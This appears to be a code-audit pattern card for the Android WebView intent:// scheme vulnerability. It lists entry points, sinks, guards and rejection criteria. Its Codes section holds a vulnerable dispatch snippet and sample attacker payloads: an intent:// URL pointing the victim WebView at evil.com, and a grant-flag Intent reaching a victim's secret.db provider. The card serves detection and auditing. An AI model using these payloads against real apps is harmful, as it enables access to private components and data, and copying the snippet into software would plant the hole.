# Pattern: WebView Intent Scheme

## Match

WebView dispatches `intent://` URLs to `startActivity` / `Intent.parseUri`. The attacker-controlled `intent://` payload carries `component`/`package`/`selector`/`S.<key>=<value>` extras/`FLAG_GRANT_*` flags/`ClipData` that `Intent.parseUri` does not strip. **Non-obvious**: pre-API 30, `FLAG_GRANT_*` flags travel through `Intent.parseUri` and let an untrusted WebView reach non-exported victim Activities with grants. AOSP stripped `FLAG_GRANT_*` from parser starting API 30+.

## Analyze

- entry: `WebViewClient.shouldOverrideUrlLoading`, `WebChromeClient.onCreateWindow`, `WebView.loadUrl(attackerUrl)`, attacker-controlled deep-link query
- control: `intent://` URL, target `component` / `package`, `S.<key>` extras, `FLAG_GRANT_*` flags, `ClipData`, source URL, source frame
- sink: `Intent.parseUri(url, URI_INTENT_SCHEME)` → `startActivity`, native bridge, `WebView.loadUrl("javascript:...")` triggered from a `file://` page, deep-link route reached from the parsed Intent
- guard: `shouldOverrideUrlLoading` rejects `intent://` (`return true` without dispatch), never call `Intent.parseUri` on WebView-originated URLs, allowlist for `http(s)://` only, do not use JS bridge to dispatch `intent://` URLs
- impact: launch non-exported Activity/Service/Receiver, grant attacker read/write to `content://` provider, bypass internal business logic, chain into intent redirect or parser split

## Reject

Reject when the WebView never calls `Intent.parseUri` on WebView-originated URLs, the WebView is restricted to `http(s)://` allowlist, and no JS bridge reaches `Intent.parseUri`.

## Codes

```java
// WebView dispatches intent:// to startActivity — attacker reaches a non-exported victim Activity
if ("intent".equals(uri.getScheme())) startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
```

```text
# attacker URL — selector + component + S. extras + grant flags travel through parseUri
intent:#Intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;B.intent=...;end
```

```java
// attacker builds a redirect Intent that carries grant flag + content://
next.setClassName("com.victim", "com.victim.ui.WebViewActivity");
next.setData(Uri.parse("content://com.victim.fileprovider/.../secret.db"));
next.setFlags(FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION);
```

```java
// loadUrl with intent:// from inside an attacker page
webView.loadUrl("intent:#Intent;component=com.victim/.PrivateActivity;end");
```
